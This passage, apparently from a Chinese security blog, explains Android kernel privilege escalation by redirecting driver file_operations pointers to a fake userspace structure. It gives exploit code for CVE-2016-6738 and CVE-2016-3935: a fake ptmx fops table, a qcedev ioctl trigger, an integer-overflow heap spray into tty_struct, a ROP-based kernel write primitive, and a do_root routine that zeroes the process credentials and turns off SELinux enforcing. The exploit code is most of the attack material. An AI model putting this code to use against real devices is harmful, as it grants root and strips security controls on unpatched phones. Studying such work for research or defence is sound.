<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Function_pointer_overwrite" target="_blank" rel="noopener">Function pointer overwrite</a></li>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Userspace_execution" target="_blank" rel="noopener">Userspace execution</a></li>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Userspace_data_usage" target="_blank" rel="noopener">Userspace data usage</a></li>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Reused_code_chunks" target="_blank" rel="noopener">Reused code chunks</a></li>
</ul>
<p>针对以上提权方法，<a href="https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project/Work" target="_blank" rel="noopener">Kernel_Self_Protection_Project</a> 开发了对应的一系列缓解措施，目前这些措施正在逐步推入<strong>linux kernel</strong> 主线，下面是其中一部分缓解方案，可以看到，我们回顾的所有利用方法都已经被考虑在内，不久的将来，这些方法可能都会失效</p>
<ul>
<li>Split thread_info off of kernel stack (Done: x86, arm64, s390. Needed on arm, powerpc and others?) * Move kernel stack to vmap area (Done: x86, s390. Needed on arm, arm64, powerpc and others?)</li>
<li>Implement kernel relocation and KASLR for ARM</li>
<li>Write a plugin to clear struct padding</li>
<li>Write a plugin to do format string warnings correctly (gcc’s -Wformat-security is bad about const strings)</li>
<li>Make CONFIG_STRICT_KERNEL_RWX and CONFIG_STRICT_MODULE_RWX mandatory (done for arm64 and x86, other archs still need it)</li>
<li>Convert remaining BPF JITs to eBPF JIT (with blinding) (In progress: arm)</li>
<li>Write lib/test_bpf.c tests for eBPF constant blinding</li>
<li>Further restriction of perf_event_open (e.g. perf_event_paranoid=3)</li>
<li>Extend HARDENED_USERCOPY to use slab whitelisting (in progress)</li>
<li>Extend HARDENED_USERCOPY to split user-facing malloc()s and in-kernel malloc()svmalloc stack guard pages (in progress)</li>
<li>protect ARM vector table as fixed-location kernel target</li>
<li>disable kuser helpers on arm</li>
<li>rename CONFIG_DEBUG_LIST better and default=y</li>
<li>add WARN path for page-spanning usercopy checks (instead of the separate CONFIG)</li>
<li>create UNEXPECTED(), like BUG() but without the lock-busting, etc</li>
<li>create defconfig “make” target for by-default hardened Kconfigs (using guidelines below)</li>
<li>provide mechanism to check for ro_after_init memory areas, and reject structures not marked ro_after_init in vmbus_register()</li>
<li>expand use of __ro_after_init, especially in arch/arm64</li>
<li>Add stack-frame walking to usercopy implementations (Done: x86. In progress: arm64. Needed on arm, others?)</li>
<li>restrict autoloading of kernel modules (like GRKERNSEC_MODHARDEN) (In progress: Timgad LSM)</li>
</ul>
<p>有兴趣的同学可以进入该项目看看代码，提前了解一下缓解措施，</p>
<p>比如 <code>KASLR for ARM</code>, 将大部分内核对象的地址做了随机化处理，这是以后 android kernel exploit 必须面对的; </p>
<p>另外比如 <code>__ro_after_init</code> ，内核启动完成初始化之后大部分 <strong>fops</strong> 全局变量都变成 readonly 的，这造成了本文这种利用方法失效, 所幸的是，目前 android kernel 还是可以用的。</p>
<h4 id="本文使用的利用方法"><a href="#本文使用的利用方法" class="headerlink" title="本文使用的利用方法 [^]"></a>本文使用的利用方法 <a href="#top">[^]</a></h4><p><span id="this-kernel-exp"></span> </p>
<p>对照 <a href="https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project/Work" target="_blank" rel="noopener">Kernel_Self_Protection_Project</a> 的利用分类，本文的利用思路属于 <a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Userspace_data_usage" target="_blank" rel="noopener">Userspace data usage</a></p>
<blockquote>
<p>Sometimes an attacker won’t be able to control the instruction pointer directly, but they will be able to redirect the dereference a structure or other pointer. In these cases, it is easiest to aim at malicious structures that have been built in userspace to perform the exploitation.</p>
</blockquote>
<p>具体来说，我们在应用层构造一个伪 <strong>file_operations</strong> 结构体(其他如 <strong>tty_operations</strong> 也可以)，然后通过漏洞改写内核某一个驱动的 <strong>fops</strong> 指针，将其改指向我们在应用层伪造的结构体，之后，我们搜索特定的 rop 并随时替换这个伪 <strong>file_operations</strong> 结构体里的函数实现，就可以做到在内核多次执行任意代码（取决于rop) ，这种方法的好处包括：</p>
<ol>
<li>内核有很多驱动，所以 fops 非常多，地址上也比较分散，对一些溢出类漏洞来说，选择比较多</li>
<li>内核的 fops 一般都存放在 writable 的 data 区，至少目前android 主流 kernel 依然如此</li>
<li>将内核的 fops 指向用户空间后，用户空间可以随意改写其内部函数的实现</li>
<li>只需要一次内核写</li>
</ol>
<p>下面结合漏洞说明怎么利用</p>
<h3 id="CVE-2016-6738-漏洞利用"><a href="#CVE-2016-6738-漏洞利用" class="headerlink" title="CVE-2016-6738 漏洞利用 [^]"></a>CVE-2016-6738 漏洞利用 <a href="#top">[^]</a></h3><p><span id="CVE-2016-6738-exp"></span> </p>
<p>CVE-2016-6738 是一个任意地址写任意值的漏洞，利用代码已经提交在 <a href="https://github.com/453483289/android_vuln_poc-exp/tree/master/EXP-CVE-2016-6738" target="_blank" rel="noopener">EXP-CVE-2016-6738</a></p>
<p>我们选择重定向 /dev/ptmx 设备的 file_operations, 先在用户态构造一个伪结构，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">map</span> = mmap(<span class="number">0x1000000</span>, (<span class="keyword">size_t</span>)<span class="number">0x10000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, (<span class="keyword">off_t</span>)<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">map</span> == MAP_FAILED) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] Failed to mmap landing (%d-%s)\n"</span>, errno, strerror(errno));</span><br><span class="line">        ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf("[+] landing mmap'ed @ %p\n", map);</span></span><br><span class="line"><span class="built_in">memset</span>(<span class="built_in">map</span>, <span class="number">0x0</span>, <span class="number">0x10000</span>);</span><br><span class="line">fake_ptmx_fops = <span class="built_in">map</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] fake_ptmx_fops = 0x%lx\n"</span>,fake_ptmx_fops);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">1</span> * <span class="number">8</span>) = PTMX_LLSEEK;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">2</span> * <span class="number">8</span>) = PTMX_READ;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">3</span> * <span class="number">8</span>) = PTMX_WRITE;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">8</span> * <span class="number">8</span>) = PTMX_POLL;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">9</span> * <span class="number">8</span>) = PTMX_IOCTL;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">10</span> * <span class="number">8</span>) = COMPAT_PTMX_IOCTL;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">12</span> * <span class="number">8</span>) = PTMX_OPEN;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">14</span> * <span class="number">8</span>) = PTMX_RELEASE;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">17</span> * <span class="number">8</span>) = PTMX_FASYNC;</span><br></pre></td></tr></table></figure>

<p>根据前面的分析，伪结构的值需要先做一次加密，再使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> edata = <span class="number">0</span>;</span><br><span class="line">       qcedev_encrypt(fd, fake_ptmx_fops, &amp;edata);</span><br><span class="line">       trigger(fd, edata);</span><br></pre></td></tr></table></figure>

<p>下面是核心的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">trigger</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cmd;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> dst;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">qcedev_cipher_op_req</span> <span class="title">params</span>;</span></span><br><span class="line"></span><br><span class="line">        dst = PTMX_MISC + <span class="number">8</span> * <span class="number">9</span>; <span class="comment">// patch ptmx_cdev-&gt;ops</span></span><br><span class="line">        <span class="built_in">size</span> = <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;params, <span class="number">0</span>, <span class="keyword">sizeof</span>(params));</span><br><span class="line">        cmd = QCEDEV_IOCTL_DEC_REQ;</span><br><span class="line">        params.entries = <span class="number">1</span>;</span><br><span class="line">        params.in_place_op = <span class="number">1</span>; <span class="comment">// bypass access_ok check of creq-&gt;vbuf.dst[i].vaddr</span></span><br><span class="line">        params.alg = QCEDEV_ALG_DES;</span><br><span class="line">        params.mode = QCEDEV_DES_MODE_ECB;</span><br><span class="line">        params.data_len = <span class="built_in">size</span>;</span><br><span class="line">        params.vbuf.src[<span class="number">0</span>].len = <span class="built_in">size</span>;</span><br><span class="line">        params.vbuf.src[<span class="number">0</span>].vaddr = &amp;src;</span><br><span class="line">        params.vbuf.dst[<span class="number">0</span>].len = <span class="built_in">size</span>;</span><br><span class="line">        params.vbuf.dst[<span class="number">0</span>].vaddr = dst;</span><br><span class="line">        <span class="built_in">memcpy</span>(params.enckey,<span class="string">"test"</span>, <span class="number">16</span>);</span><br><span class="line">        params.encklen = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] overwrite ptmx_cdev ops\n"</span>);</span><br><span class="line">        ret = ioctl(fd, cmd, &amp;params); <span class="comment">// trigger </span></span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[-] Ioctl qcedev fail(%s - %d)\n"</span>, strerror(errno), errno);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数 src 就是 <strong>fake_ptmx_fops</strong> 加密后的值，我们将其地址放入 <strong>qcedev_cipher_op_req.vbuf.src[0].vaddr</strong> 里，目标地址 <strong>qcedev_cipher_op_req.vbuf.dst[0].vaddr</strong> 存放 <strong>ptmx_cdev-&gt;ops</strong> 的地址，然后调用 ioctl 触发漏洞，任意地址写漏洞触发后，目标地址 <strong>ptmx_cdev-&gt;ops</strong> 的值会被覆盖为 <strong>fake_ptmx_fops</strong>.</p>
<p>此后，对 ptmx 设备的内核fops函数执行，都会被重定向到用户层伪造的函数，我们通过一些rop 片段来实现伪函数，就可以被内核直接调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * rop write:</span></span><br><span class="line"><span class="comment"> * ffffffc000671a58:       b9000041        str     w1, [x2]</span></span><br><span class="line"><span class="comment"> * ffffffc000671a5c:       d65f03c0        ret</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROP_WRITE       0xffffffc000671a58</span></span><br></pre></td></tr></table></figure>

<p>比如，我们找到一段 rop 如上，其地址是 0xffffffc000671a58， 其指令是 str w1, [x2] ; ret ;</p>
<p>这段 rop 作为一个函数去执行的话，其效果相当于将第二个参数的值写入第三个参数指向的地址。</p>
<p>我们用这段 rop 构造一个用户态函数，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kernel_write_32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> arg;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fake_ptmx_fops + <span class="number">9</span> * <span class="number">8</span>) = ROP_WRITE;</span><br><span class="line"></span><br><span class="line">        arg = addr;</span><br><span class="line">        ioctl_syscall(__NR_ioctl, ptmx_fd, val, arg);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>9*8 是 ioctl 函数在 file_operations 结构体里的偏移，</p>
<p> <code>*(unsigned long*)(fake_ptmx_fops + 9 * 8) = ROP_WRITE;</code></p>
<p>的效果就是 ioctl 的函数实现替换成 <strong>ROP_WRITE</strong>, 这样我们调用 ptmx 的 ioctl 函数时，最后真实执行的是 <strong>ROP_WRITE</strong>, 这就是一个内核任意地址写任意值函数。</p>
<p>同样的原理，我们封装读任意内核地址的函数。</p>
<p>有了任意内核地址读写函数之后，我们通过以下方法完成最终提权：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_root</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret; </span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> i, cred, addr;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> tmp0;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* search myself */</span></span><br><span class="line">        ret = get_task_by_comm(&amp;my_task);</span><br><span class="line">        <span class="keyword">if</span>(ret != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[-] get myself fail!\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!my_task || (my_task &lt; <span class="number">0xffffffc000000000</span>)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"invalid task address!"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ret = kernel_read(my_task + cred_offset, &amp;cred);</span><br><span class="line">        <span class="keyword">if</span> (cred &lt; KERNEL_BASE) <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line"></span><br><span class="line">        i = <span class="number">1</span>; </span><br><span class="line">        addr = cred + <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        ret = kernel_read_32(addr, &amp;tmp0);</span><br><span class="line">        <span class="keyword">if</span>(tmp0 == <span class="number">0x43736564</span> || tmp0 == <span class="number">0x44656144</span>)</span><br><span class="line">                i += <span class="number">4</span>;</span><br><span class="line">        addr = cred + (i+<span class="number">0</span>) * <span class="number">4</span>;</span><br><span class="line">        ret = kernel_write_32(addr, <span class="number">0</span>);</span><br><span class="line">        addr = cred + (i+<span class="number">1</span>) * <span class="number">4</span>;</span><br><span class="line">        ret = kernel_write_32(addr, <span class="number">0</span>);</span><br><span class="line">...     </span><br><span class="line">        ret = kernel_write_32(addr, <span class="number">0xffffffff</span>);</span><br><span class="line">        addr = cred + (i+<span class="number">16</span>) * <span class="number">4</span>;</span><br><span class="line">        ret = kernel_write_32(addr, <span class="number">0xffffffff</span>);</span><br><span class="line">        <span class="comment">/* success! */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// disable SELinux</span></span><br><span class="line">        kernel_write_32(SELINUX_ENFORCING, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>搜索到本进程的 cred 结构体，并使用我们封装的内核读写函数，将其成员的值改为0，这样本进程就变成了 root 进程。<br>搜索本进程 <strong>task_struct</strong> 的函数 <strong>get_task_by_comm</strong>  具体实现参考 github 的代码。</p>
<h3 id="CVE-2016-3935-漏洞利用"><a href="#CVE-2016-3935-漏洞利用" class="headerlink" title="CVE-2016-3935 漏洞利用 [^]"></a>CVE-2016-3935 漏洞利用 <a href="#top">[^]</a></h3><p><span id="CVE-2016-3935-exp"></span> </p>
<p>这个漏洞的提权方法跟 6738 是一样的，唯一不同的地方是，这是一个堆溢出漏洞，我们只能覆盖堆里边的 fops (cve-2016-6738 我们覆盖的是 .data 区里的 fops )。</p>
<p>在我测试的版本里，k_buf_src 是从 kmalloc-4096 分配出来的，因此，需要找到合适的结构来填充 kmalloc-4096 ，经过一些源码搜索，我找到了 <strong>tty_struct</strong> 这个结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include/linux/tty.h</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span>     magic;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">        <span class="keyword">int</span> index;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在我做利用的设备里，这个结构是从 kmalloc-4096 堆里分配的，其偏移 24Byte 的地方是一个 <strong>struct tty_operations</strong> 的指针，我们溢出后重写这个结构体，用一个用户态地址覆盖这个指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TTY_MAGIC               0x5401</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 632 <span class="comment">// SIZE = sizeof(struct tty_struct)</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ret, cmd, i;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span>  <span class="title">qcedev_sha_op_req</span> <span class="title">params</span>;</span></span><br><span class="line">        <span class="keyword">int</span> *magic;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> * ttydriver;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> * ttyops;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;params, <span class="number">0</span>, <span class="keyword">sizeof</span>(params));</span><br><span class="line">        params.entries = <span class="number">9</span>;</span><br><span class="line">        params.data_len = SIZE;</span><br><span class="line">        params.authklen = <span class="number">16</span>;</span><br><span class="line">        params.authkey = &amp;trigger_buf[<span class="number">0</span>];</span><br><span class="line">        params.alg = QCEDEV_ALG_AES_CMAC;</span><br><span class="line"></span><br><span class="line"><span class="comment">// when tty_struct coming from kmalloc-4096</span></span><br><span class="line">        magic =(<span class="keyword">int</span> *) &amp;trigger_buf[<span class="number">4096</span>];</span><br><span class="line">        *magic = TTY_MAGIC;</span><br><span class="line">        ttydriver = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;trigger_buf[<span class="number">4112</span>];</span><br><span class="line">        *ttydriver = &amp;trigger_buf[<span class="number">0</span>];</span><br><span class="line">        ttyops = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;trigger_buf[<span class="number">4120</span>];</span><br><span class="line">        *ttyops = fake_ptm_fops;</span><br><span class="line">        params.data[<span class="number">0</span>].len = <span class="number">4128</span>;</span><br><span class="line">        params.data[<span class="number">0</span>].vaddr = &amp;trigger_buf[<span class="number">0</span>];</span><br><span class="line">        params.data[<span class="number">1</span>].len = <span class="number">536867423</span> ;</span><br><span class="line">        params.data[<span class="number">1</span>].vaddr = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt; params.entries; i++) &#123;</span><br><span class="line">                params.data[i].len = <span class="number">0x1fffffff</span>;</span><br><span class="line">                params.data[i].vaddr = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cmd = QCEDEV_IOCTL_SHA_UPDATE_REQ;</span><br><span class="line">        ret = ioctl(fd, cmd, &amp;params);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[-] ioctl fail %s\n"</span>,strerror(errno));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] succ trigger\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>4128 + 536867423 + 7 * 0x1fffffff = 632</code></p>
<p>溢出的方法如上，我们让 entry 的数目为 9 个，第一个长度为 4128, 第二个为 536867423， 其他7个为0x1fffffff </p>
<p>这样他们加起来溢出之后的值就是 632， 这个长度刚好是 <strong>struct tty_struct</strong> 的长度，我们用  <strong>qcedev_sha_op_req.data[0].vaddr[4096]</strong> 这个数据来填充被溢出的 <strong>tty_struct</strong> 的内容</p>
<p>主要是填充两个地方，一个是最开头的 <strong>tty magic</strong>, 另一个就是偏移 24Bype 的 <strong>tty_operations</strong> 指针，我们将这个指针覆盖为伪指针 <strong>fake_ptm_fops</strong>. </p>
<p>之后的提权操作与 cve-2016-6738 类似，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include/linux/tty_driver.h</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">                        <span class="title">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">        <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">void</span> (*<span class="built_in">remove</span>)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">int</span>  (*<span class="built_in">open</span>)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">        <span class="keyword">void</span> (*<span class="built_in">close</span>)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">        <span class="keyword">void</span> (*<span class="built_in">shutdown</span>)(struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">int</span>  (*<span class="built_in">write</span>)(struct tty_struct * tty,</span><br><span class="line">                      <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">        <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">        <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">        <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">                    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">        <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                             <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上，ioctl 函数在 <strong>tty_operations</strong> 结构体里偏移 12 个指针，当我们用 <strong>ROP_WRITE</strong> 覆盖这个位置时，可以得到一个内核地址写函数。</p>
